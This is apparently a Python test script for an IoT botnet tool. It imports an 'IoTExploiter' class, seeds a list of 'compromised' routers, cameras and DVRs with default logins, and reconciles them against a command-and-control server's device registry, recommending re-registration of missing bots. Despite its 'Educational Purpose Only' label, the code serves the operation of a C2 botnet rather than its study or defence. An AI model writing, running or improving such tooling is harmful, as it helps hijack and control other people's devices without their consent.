#!/usr/bin/env python3
"""
IoT Digital Twin - Enhanced Registration Verification Test

Comprehensive test script for registration synchronization functionality
with manual fallback analysis and error handling validation.

Educational Purpose Only - For Controlled Lab Environment
Author: IoT Security Research Team
Date: June 2025
"""

import sys
import os
import json
from datetime import datetime

# Add the parent directory to sys.path to import the exploit module
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

from exploit import IoTExploiter

def test_registration_verification():
    """Test the registration verification system with simulated data"""
    
    print("🧪 Testing Registration Verification System")
    print("=" * 60)
    
    # Create exploiter instance
    exploiter = IoTExploiter("http://192.168.1.100:5000", "192.168.1.0/24")
    
    # Create simulated compromised devices with mixed registration status
    simulated_devices = [
        {
            'ip': '192.168.1.100',
            'username': 'admin',
            'password': 'admin',
            'status': 'online',
            'registered_c2': True,
            'device_type': 'router',
            'timestamp': datetime.now().isoformat()
        },
        {
            'ip': '192.168.1.101',
            'username': 'admin', 
            'password': '123456',
            'status': 'online',
            'registered_c2': True,
            'device_type': 'camera',
            'timestamp': datetime.now().isoformat()
        },
        {
            'ip': '192.168.1.102',
            'username': 'root',
            'password': 'password',
            'status': 'error',
            'registered_c2': False,
            'device_type': 'dvr',
            'error': 'C2 server timeout during registration',
            'timestamp': datetime.now().isoformat()
        }
    ]
    
    # Set the simulated devices
    exploiter.compromised_devices = simulated_devices
    
    print("📊 Test Setup:")
    print(f"  • Total local devices: {len(simulated_devices)}")
    print(f"  • Marked as registered: {sum(1 for d in simulated_devices if d.get('registered_c2'))}")
    print(f"  • Marked as not registered: {sum(1 for d in simulated_devices if not d.get('registered_c2'))}")
    print()
    
    # Test the verify_c2_registration_status method directly
    print("🔧 Testing C2 Registration Status Verification...")
    print("-" * 60)
    
    try:
        # This will test the method that's accessible in the menu
        exploiter.verify_c2_registration_status()
        print("✅ Registration verification completed successfully")
    except Exception as e:
        print(f"❌ Error during registration verification: {e}")
    
    print()
    print("📋 Manual Registration Analysis:")
    print("-" * 60)
    
    # Manually implement registration discrepancy analysis 
    local_count = len(exploiter.compromised_devices)
    local_registered = sum(1 for d in exploiter.compromised_devices if d.get('registered_c2'))
    
    print(f"📊 LOCAL DATA:")
    print(f"   • Total compromised devices: {local_count}")
    print(f"   • Devices marked as registered: {local_registered}")
    print(f"   • Devices marked as NOT registered: {local_count - local_registered}")
    print()
    
    # Try to fetch C2 server data
    try:
        import requests
        response = requests.get(f"{exploiter.cnc_url}/get-compromised-devices", timeout=5)
        if response.status_code == 200:
            c2_devices = response.json()
            c2_count = len(c2_devices)
            c2_device_ips = {device.get('ip') for device in c2_devices if device.get('ip')}
            
            print(f"🌐 C2 SERVER DATA:")
            print(f"   • Total registered devices: {c2_count}")
            print(f"   • Device IPs in database: {sorted(c2_device_ips)}")
            print()
            
            # Find discrepancies
            local_ips = {device.get('ip') for device in exploiter.compromised_devices}
            
            missing_from_c2 = local_ips - c2_device_ips
            extra_in_c2 = c2_device_ips - local_ips
            
            print(f"🔍 DISCREPANCY ANALYSIS:")
            if missing_from_c2:
                print(f"   ❌ Devices in local list but NOT in C2 server ({len(missing_from_c2)}):")
                for ip in sorted(missing_from_c2):
                    local_device = next((d for d in exploiter.compromised_devices if d.get('ip') == ip), None)
                    if local_device:
                        reg_status = "✓" if local_device.get('registered_c2') else "✗"
                        error = local_device.get('error', 'No error recorded')
                        print(f"      • {ip} [{reg_status}] - {error}")
            else:
                print(f"   ✅ All local devices are registered in C2 server")
                
            if extra_in_c2:
                print(f"   ⚠️  Devices in C2 server but NOT in local list ({len(extra_in_c2)}):")
                for ip in sorted(extra_in_c2):
                    print(f"      • {ip} (possibly from previous sessions)")
                    
            print()
            print(f"💡 RECOMMENDED ACTIONS:")
            if missing_from_c2:
                print(f"   1. Use 'Verify and fix C2 registration status' to re-register missing devices")
                print(f"   2. Check C2 server logs for registration errors") 
                print(f"   3. Verify network connectivity between exploit script and C2 server")
            if extra_in_c2:
                print(f"   4. Extra devices in C2 are normal (from previous sessions)")
                
        else:
            print(f"❌ Failed to fetch C2 server data. Status: {response.status_code}")
            print(f"🔧 This explains why devices show as 'not registered' - C2 server is unreachable!")
            
    except Exception as e:
        print(f"❌ Error connecting to C2 server: {e}")
        print(f"🔧 This explains why devices show as 'not registered' - C2 server is unreachable!")
    
    print("=" * 60)
    print("✅ Registration verification test completed")
    print()
    print("🔄 The system can now:")
    print("   • Detect registration synchronization issues")
    print("   • Identify devices that failed to register with C2")
    print("   • Provide actionable recommendations for fixes")
    print("   • Re-register failed devices automatically")

if __name__ == "__main__":
    test_registration_verification()
